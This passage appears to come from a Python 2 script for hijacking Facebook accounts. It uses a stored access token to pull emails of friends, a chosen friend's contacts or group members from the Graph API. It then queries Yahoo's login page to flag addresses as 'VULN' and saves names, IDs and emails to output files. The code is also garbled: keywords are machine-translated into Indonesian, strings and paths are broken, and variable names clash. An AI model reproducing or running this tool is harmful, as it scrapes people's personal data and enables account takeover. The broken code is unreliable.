						cetak '\ 033 [1; 91m ~ \ 033 [1; 97m' + q ['sekolah'] ['nama']
					kecuali KeyError: cetak '\ 033 [1; 91m ~ \ 033 [1; 91mTidak ada'
			kecuali KeyError: lulus
			raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
			Tidak bisa()
		lain:
			lulus
	lain:
		print "\ 033 [1; 96m [✖] \ x1b [1; 91mAkun tidak ditemukan"
		raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
		Tidak bisa()

def yahoo ():
	toket global
	os.system ('jelas')
	mencoba:
		toket = open ('login.txt', 'r'). read ()
	kecuali IOError:
		cetak "\ 033 [1; 91m [!] Token tidak valid"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		keluar ()
	os.system ('jelas')
	cetak logo
	cetak 42 * "\ 033 [1; 96m ="
	cetak "\ x1b [1; 97m1. \ x1b [1; 93m Klon dari daftar teman"
	cetak "\ x1b [1; 97m2. \ x1b [1; 93m Klon dari teman"
	cetak "\ x1b [1; 97m3. \ x1b [1; 93m Klon dari grup anggota"
	cetak "\ x1b [1; 97m4. \ x1b [1; 93m Kloning dari file"
	cetak "\ n \ x1b [1; 91m0. \ x1b [1; 91m Kembali"
	klon()
       
def clone ():
	embuh = raw_input ("\ n \ x1b [1; 97m >>>")
	jika embuh == "":
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
	elif embuh == "1":
		clone_dari_daftar_teman ()
	elif embuh == "2":
		clone_dari_teman ()
	elif embuh == "3":
		clone_dari_member_group ()
	elif embuh == "4":
		clone_dari_file ()
	elif embuh == "0":
		Tidak bisa()
	lain:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
		

def clone_dari_daftar_teman ():
	toket global
	os.system ('reset')
	mencoba:
		toket = open ('login.txt', 'r'). read ()
	kecuali IOError:
		cetak "\ 033 [1; 91m [!] Token Tidak Valid"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		keluar ()
	mencoba:
		os.mkdir ('keluar')
	kecuali OSError:
		lulus
	os.system ('jelas')
	cetak logo
	mpsh = []
	jml = 0
	cetak 42 * "\ 033 [1; 96m ="
	jalan ('\ 033 [1; 96m [\ x1b [1; 97m✺ \ x1b [1; 96m] \ 033 [1; 93mMengambil email \ 033 [1; 97m ...')
	teman = requests.get ('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads (teman.text)
	jalan ('\ 033 [1; 96m [\ x1b [1; 97m✺ \ x1b [1; 96m] \ 033 [1; 93m Mulai \ 033 [1; 97m ...')
	cetak ('\ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z')
	cetak 42 * "\ 033 [1; 96m ="
	untuk w di kimak ['data']:
		jml + = 1
		mpsh.append (jml)
		id = w ['id']
		nama = w ['name']
		links = requests.get ("https://graph.facebook.com/" + id + "? access_token =" + toket)
		z = json.loads (links.text)
		mencoba:
			mail = z ['email']
			yahoo = re.compile (r '@. *')
			otw = yahoo.search (mail) .group ()
			if 'yahoo.com' dalam otw:
				br.open ("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = Benar
				br.select_form (nr = 0)
				br ["username"] = email
				klik = br.submit (). read ()
				jok = re.compile (r '"messages.ERROR_INVALID_USERNAME">. *')
				mencoba:
					pek = jok.search (klik) .group ()
				kecuali:
					terus
				jika '"messages.ERROR_INVALID_USERNAME">' di pek:
					cetak ("\ 033 [1; 96m [✓] \ 033 [1; 92mVULN")
					cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mID \ 033 [1; 91m: \ 033 [1; 92m" + id)
					cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mEmail \ 033 [1; 91m: \ 033 [1; 92m" + mail)
					cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mNama \ 033 [1; 91m: \ 033 [1; 92m" + nama + '\ n')
					save = open ('out / MailVuln.txt', 'a')
					save.write ("Nama:" + nama + '\ n' "ID:" + id + '\ n' "Email:" + mail + '\ n \ n')
					save.close ()
					berhasil.append (mail)
		kecuali KeyError:
			lulus
	cetak 42 * "\ 033 [1; 96m ="
	cetak '\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
	print "\ 033 [1; 96m [+] \ 033 [1; 92mTotal \ 033 [1; 91m: \ 033 [1; 97m" + str (len (berhasil))
	print "\ 033 [1; 96m [+] \ 033 [1; 92mFile disimpan \ 033 [1; 91m: \ 033 [1; 97m keluar / MailVuln.txt"
	raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
	Tidak bisa()
		

def clone_dari_teman ():
	toket global
	os.system ('jelas')
	mencoba:
		toket = open ('login.txt', 'r'). read ()
	kecuali IOError:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		keluar ()
	mencoba:
		os.mkdir ('keluar')
	kecuali OSError:
		lulus
	os.system ('jelas')
	cetak logo
	mpsh = []
	jml = 0
	cetak 42 * "\ 033 [1; 96m ="
	idt = raw_input ("\ 033 [1; 96m [+] \ 033 [1; 93mMasukan ID teman \ 033 [1; 91m: \ 033 [1; 97m")
	mencoba:
		jok = requests.get ("https://graph.facebook.com/" + idt + "? access_token =" + toket)
		op = json.loads (jok.text)
		cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mNama \ 033 [1; 91m: \ 033 [1; 97m" + op ["name"]
	kecuali KeyError:
		print "\ 033 [1; 96m [!] \ x1b [1; 91mTeman tidak ditemukan"
		raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
		Tidak bisa()
	jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93mMengambil email \ 033 [1; 97m ...')
	teman = requests.get ('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads (teman.text)
	jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93m Mulai \ 033 [1; 97m ...')
	cetak ('\ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z')
	cetak 43 * "\ 033 [1; 96m ="
	untuk w di kimak ['data']:
		jml + = 1
		mpsh.append (jml)
		id = w ['id']
		nama = w ['name']
		links = requests.get ("https://graph.facebook.com/" + id + "? access_token =" + toket)
		z = json.loads (links.text)
		mencoba:
			mail = z ['email']
			yahoo = re.compile (r '@. *')
			otw = yahoo.search (mail) .group ()
			if 'yahoo.com' dalam otw:
				br.open ("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = Benar
				br.select_form (nr = 0)
				br ["username"] = email
				klik = br.submit (). read ()
				jok = re.compile (r '"messages.ERROR_INVALID_USERNAME">. *')
				mencoba:
					pek = jok.search (klik) .group ()
				kecuali:
					terus
				jika '"messages.ERROR_INVALID_USERNAME">' di pek:
					cetak ("\ 033 [1; 96m [✓] \ 033 [1; 92mVULN")
					cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mID \ 033 [1; 91m: \ 033 [1; 92m" + id)
					cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mEmail \ 033 [1; 91m: \ 033 [1; 92m" + mail)
					cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mNama \ 033 [1; 91m: \ 033 [1; 92m" + nama)
					save = open ('out / TemanMailVuln.txt', 'a')
					save.write ("Nama:" + nama + '\ n' "ID:" + id + '\ n' "Email:" + mail + '\ n \ n')
					save.close ()
					berhasil.append (mail)
		kecuali KeyError:
			lulus
	cetak 42 * "\ 033 [1; 96m ="
	cetak '\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
	print "\ 033 [1; 96m [+] \ 033 [1; 92mTotal \ 033 [1; 91m: \ 033 [1; 97m" + str (len (berhasil))
	print "\ 033 [1; 96m [+] \ 033 [1; 92mFile disimpan \ 033 [1; 91m: \ 033 [1; 97m keluar / TemanMailVuln.txt"
	raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
	Tidak bisa()
	
def clone_dari_member_group ():
	toket global
	os.system ('jelas')
	mencoba:
		toket = open ('login.txt', 'r'). read ()
	kecuali IOError:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		keluar ()
	mencoba:
		os.mkdir ('keluar')
	kecuali OSError:
		lulus
	os.system ('jelas')
	cetak logo
	mpsh = []
	jml = 0
	cetak 42 * "\ 033 [1; 96m ="
	id = raw_input ('\ 033 [1; 96m [+] \ 033 [1; 93mMasukan grup ID \ 033 [1; 91m: \ 033 [1; 97m')
	mencoba:
		r = requests.get ('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw = json.loads (r.text)
		cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mNama grup \ 033 [1; 91m: \ 033 [1; 97m" + asw ['name' ]
	kecuali KeyError:
		print "\ 033 [1; 96m [!] \ x1b [1; 91mGroup tidak ditemukan"
		raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
		Tidak bisa()
	jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93mMengambil email \ 033 [1; 97m ...')
	teman = requests.get ('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads (teman.text)
	jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93m Mulai \ 033 [1; 97m ...')
	cetak ('\ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z')
	cetak 42 * "\ 033 [1; 96m ="
	untuk w di kimak ['data']:
		jml + = 1
		mpsh.append (jml)
		id = w ['id']
		nama = w ['name']
		links = requests.get ("https://graph.facebook.com/" + id + "? access_token =" + toket)
		z = json.loads (links.text)
		mencoba:
			mail = z ['email']
			yahoo = re.compile (r '@. *')
			otw = yahoo.search (mail) .group ()
			if 'yahoo.com' dalam otw:
				br.open ("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = Benar
				br.select_form (nr = 0)
				br ["username"] = email
				klik = br.submit (). read ()
				jok = re.compile (r '"messages.ERROR_INVALID_USERNAME">. *')
				mencoba:
					pek = jok.search (klik) .group ()
				kecuali:
					terus
				jika '"messages.ERROR_INVALID_USERNAME">' di pek:
					cetak ("\ 033 [1; 96m [✓] \ 033 [1; 92mVULN")
					cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mID \ 033 [1; 91m: \ 033 [1; 92m" + id)
					cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mEmail \ 033 [1; 91m: \ 033 [1; 92m" + mail)
					cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mNama \ 033 [1; 91m: \ 033 [1; 92m" + nama)
					save = open ('out / GrupMailVuln.txt', 'a')
					save.write ("Nama:" + nama + '\ n' "ID:" + id + '\ n' "Email:" + mail + '\ n \ n')
					save.close ()
					berhasil.append (mail)
		kecuali KeyError:
			lulus
	cetak 42 * "\ 033 [1; 96m ="
	cetak '\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
	print "\ 033 [1; 96m [+] \ 033 [1; 92mTotal \ 033 [1; 91m: \ 033 [1; 97m" + str (len (berhasil))
	print "\ 033 [1; 96m [+] \ 033 [1; 92mFile disimpan \ 033 [1; 91m: \ 033 [1; 97m keluar / GrupMailVuln.txt"
	raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
	Tidak bisa()
	

def clone_dari_file ():
	toket global
	os.system ('jelas')
	mencoba:
		toket = open ('login.txt', 'r'). read ()
	kecuali IOError:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
		os.system ('rm -rf login.txt')
		time.sleep (1)
		keluar ()
	mencoba:
		os.mkdir ('keluar')
	kecuali OSError:
		lulus
	os.system ('jelas')
	cetak logo
	cetak 42 * "\ 033 [1; 96m ="
	files = raw_input ("\ 033 [1; 96m [+] \ 033 [1; 93mNama File \ 033 [1; 91m: \ 033 [1; 97m")
	mencoba:
		total = terbuka (file, "r")
		mail = total.readlines ()
	kecuali IOError:
		print "\ 033 [1; 96m [!] \ x1b [1; 91mFile tidak ditemukan"
		raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
		Tidak bisa()
	mpsh = []
	jml = 0
	jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93m Mulai \ 033 [1; 97m ...')
	cetak ('\ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z')
	cetak 42 * "\ 033 [1; 96m ="
	mail = open (file, "r"). readlines ()
	untuk pw dalam surat:
		mail = pw.replace ("\ n", "")
		jml + = 1
		mpsh.append (jml)
		yahoo = re.compile (r '@. *')
		otw = yahoo.search (mail) .group ()
		if 'yahoo.com' dalam otw:
			br.open ("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = Benar
			br.select_form (nr = 0)
			br ["username"] = email
			klik = br.submit (). read ()
			jok = re.compile (r '"messages.ERROR_INVALID_USERNAME">. *')
			mencoba:
				pek = jok.search (klik) .group ()
			kecuali:
				terus
			jika '"messages.ERROR_INVALID_USERNAME">' di pek:
				cetak ("\ 033 [1; 96m [✓] \ 033 [1; 92mVULN")
				cetak ("\ 033 [1; 96m [➹] \ 033 [1; 97mEmail \ 033 [1; 91m: \ 033 [1; 92m" + mail)
				save = open ('out / MailVuln.txt', 'a')
				save.write ("Email:" + mail + '\ n \ n')
				save.close ()
				berhasil.append (mail)
	cetak 42 * "\ 033 [1; 96m ="
	cetak '\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
	print "\ 033 [1; 96m [+] \ 033 [1; 92mTotal \ 033 [1; 91m: \ 033 [1; 97m" + str (len (berhasil))
	print "\ 033 [1; 96m [+] \ 033 [1; 92mFile Tersimpan \ 033 [1; 91m: \ 033 [1; 97m keluar / FileMailVuln.txt"
	raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mKembali \ 033 [1; 96m]")
	Tidak bisa()
	
       
		
if __name__ == '__main__':
	siapa ()
